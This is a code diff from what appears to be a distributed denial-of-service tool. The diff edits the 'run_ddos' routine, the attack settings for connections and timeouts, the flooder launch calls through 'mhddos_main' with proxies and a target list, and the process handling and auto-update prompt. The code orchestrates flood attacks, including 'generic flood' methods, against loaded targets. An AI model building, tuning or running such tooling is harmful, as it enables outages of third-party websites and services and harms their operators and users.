@@ -25,8 +25,6 @@ from src.proxies import ProxySet
 from src.system import fix_ulimits, load_configs, setup_event_loop, WINDOWS_WAKEUP_SECONDS
 from src.targets import Target, TargetsLoader
 
-#from threading import stack_size
-#stack_size(512*1024)
 
 class GeminoCurseTaskSet:
     def __init__(
@@ -65,8 +63,7 @@ class GeminoCurseTaskSet:
             pass
         except Exception:
             pass
-        finally:
-            self._launch(runnable)
+        self._launch(runnable)
 
     def __len__(self) -> int:
         return len(self._pending)
@@ -148,9 +145,13 @@ async def run_ddos(args):
     await asyncio.sleep(5)
 
     attack_settings = AttackSettings(
-        requests_per_connection=args.rpc,
+        connect_timeout_seconds=8,
         dest_connect_timeout_seconds=10.0,
         drain_timeout_seconds=10.0,
+        close_timeout_seconds=1.0,
+        http_response_timeout_seconds=15.0,
+        tcp_read_timeout_seconds=0.2,
+        requests_per_connection=args.rpc,
         high_watermark=1024 << 4,
         # note that "generic flood" attacks switch reading off completely
         reader_limit=1024 << 2,
@@ -169,17 +170,15 @@ async def run_ddos(args):
         else:
             settings = attack_settings
 
-        kwargs = {
-            'url': target.url,
-            'ip': target.addr,
-            'method': method,
-            'event': None,
-            'stats': target.create_stats(method),
-            'proxies': proxies,
-            'loop': loop,
-            'settings': settings,
-        }
-        return mhddos_main(**kwargs)
+        return mhddos_main(
+            url=target.url,
+            ip=target.addr,
+            method=method,
+            stats=target.create_stats(method),
+            proxies=proxies,
+            loop=loop,
+            settings=settings
+        )
 
     active_flooder_tasks = []
     tcp_task_group = None
@@ -363,17 +362,21 @@ async def run_ddos(args):
     await asyncio.gather(*tasks, return_exceptions=True)
 
 
+IS_AUTO_MH = os.getenv('AUTO_MH')
+IS_DOCKER = os.getenv('IS_DOCKER')
+
+
 def _main_signal_handler(ps, *args):
-    logger.info(f"{cl.BLUE}{t('Shutting down...')}{cl.RESET}")
+    if not IS_AUTO_MH:
+        logger.info(f"{cl.BLUE}{t('Shutting down...')}{cl.RESET}")
     for p in ps:
         if p.is_alive():
             p.terminate()
-    sys.exit()
 
 
 def _worker_process(args, lang: str, process_index: Optional[Tuple[int, int]]):
     try:
-        if os.getenv('IS_DOCKER'):
+        if IS_DOCKER:
             random.seed(int(time.time() // 100))
         set_language(lang)  # set language again for the subprocess
         setup_worker_logger(process_index)
@@ -412,12 +415,14 @@ def main():
         )
         print()
 
-    if not os.getenv('AUTO_MH'):
-        new_command = f'./runner.sh {os.path.basename(sys.executable)} ' + ' '.join(sys.argv[1:])
-        logger.warning(
-            f"{cl.CYAN}{t('Try running with automatic updates: ')}{new_command}{cl.RESET}"
-        )
-        print()
+    if not IS_AUTO_MH:
+        python_bin = os.path.basename(sys.executable)
+        if not python_bin.endswith('.exe'):  # windows is not supported
+            new_command = f'./runner.sh {python_bin} ' + ' '.join(sys.argv[1:])
+            logger.warning(
+                f"{cl.CYAN}{t('Try running with automatic updates: ')}{new_command}{cl.RESET}"
+            )
+            print()
 
     processes = []
     mp.set_start_method("spawn")
